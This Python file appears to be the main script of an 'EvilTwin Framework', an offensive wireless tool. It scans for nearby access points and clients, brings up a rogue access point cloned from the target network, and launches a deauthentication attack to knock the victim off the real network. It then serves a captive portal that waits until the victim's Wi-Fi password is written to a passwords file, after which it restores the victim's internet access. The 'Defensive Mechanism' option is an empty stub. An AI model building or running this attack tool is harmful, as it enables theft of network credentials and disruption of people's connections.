import os
from scapy.all import get_if_list
from prompt_toolkit import prompt
from rich.console import Console
from attack import deauth
from utils import *
from pyfiglet import figlet_format
from termcolor import cprint
import subprocess
import shlex
import sys
from ap_scanner import ap_client_scanner

"""
iphoneaf = '86:78:D0:1f:CF:86'
onenode = '2E:E4:F0:11:48:B5'
וubuntu = "98:3B:8F:03:29:0B"
"""


def count_file_chars():
    """
    Counts the characters in the passwords file in order to track changes
    this function is mainly called to detect if the user inserted a password to
    the captive domain
    """
    char_count = 0
    with open('./website/passwords.txt', 'r') as file:
        content = file.read().replace(" ", "")
        char_count = len(content)
    return char_count


def start_dnsmasq(attack_inet):
    console.print(f'[bold][yellow]Starting DNS and DHCP services[/][/]')
    current_count = count_file_chars()
    create_dnsconf_captive(attack_inet)
    args = shlex.split("dnsmasq -C config/dns.conf -d")
    p = subprocess.Popen(args, stdout=subprocess.PIPE)
    # out, err = p.communicate()
    # print(out)
    time.sleep(2)
    console.print(f'[bold][green]DNS and DHCP successfuly started[/][/]')
    console.print(f'[bold][yellow]Waiting for password input[/][/]')


    while current_count == count_file_chars():
        console.print(f'[bold][yellow].[/][/]', end=" ")
        time.sleep(1)

    console.print(f'[bold][green]Password received![/][/]')
    console.print(f'[bold][yellow]Renabling internet access for the victim[/][/]')
    p.kill()
    overwrite_dnsconf(attack_inet)
    p = subprocess.Popen(args, stdout=subprocess.PIPE)
    console.print(f'[bold][green]Internet access fully recovered ending the attack[/][/]')
    # out, err = p.communicate()
    # print(out)


os.system('clear')
console = Console()
cprint(figlet_format('Welcome to the EvilTwin Framework!', font='slant'), 'green', attrs=['bold'])
main_inet = None
internet_inet = None
scan_results = None
virtual_inet = None


while 1:
    user_input = main_menu_io()
    if user_input == "0":
        os.system('clear')
        cprint(figlet_format('Goodbye!', font='slant'), 'green')
        if virtual_inet is not None:
            cleanup(virtual_inet)
        exit()

    # Set Network Interface
    elif user_input == "1":
        main_inet = attack_inet_set()
        while main_inet not in get_if_list() or main_inet is None:
            main_inet = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
        os.system('clear')
        internet_inet = internet_inet_set()
        while internet_inet not in get_if_list() or internet_inet is None or internet_inet == main_inet:
            internet_inet = prompt(f'Please another correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
        set_inet_to_monitor(main_inet)
        set_inet_unmanaged(main_inet)
        virtual_inet = main_inet + "mon"
        set_new_virtual_inet(main_inet)

    # Network Scan
    elif user_input == "2":
        if main_inet is None or internet_inet is None:
            console.print(f'[bold][red]Error: Cannot initiate an a scan without choosing a capable network interface\n[/][/]')
            continue
        # ((mac_addr, ap_name, channel, dbm_signal), chosen_client_mac)
        scan_results = ap_client_scanner(main_inet)

    # EvilTwin set up and attack
    elif user_input == "3":
        if scan_results is None:
            console.print(f'[bold][red]Error: Cannot initiate an EvilTwin attack without first scannig for potetial targets\n[/][/]')
            continue
        set_netmask(main_inet)
        set_iptables(main_inet, internet_inet)
        set_hostapd_conf(main_inet, scan_results[0][1], scan_results[0][2])
        set_apache_serv()
        ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))

        subprocess.Popen([sys.executable, 'attack.py', str(scan_results[0][0]), str(scan_results[1]), str(virtual_inet), str(scan_results[0][2])], start_new_session=True).pid
        start_dnsmasq(main_inet)
        """
        here we need to print the password and stop!!
        """
        os.system('clear')

    # Defensive Mechanism
    elif user_input == "8":
        pass
    
    # Install Requirements
    elif user_input == "9":
        pass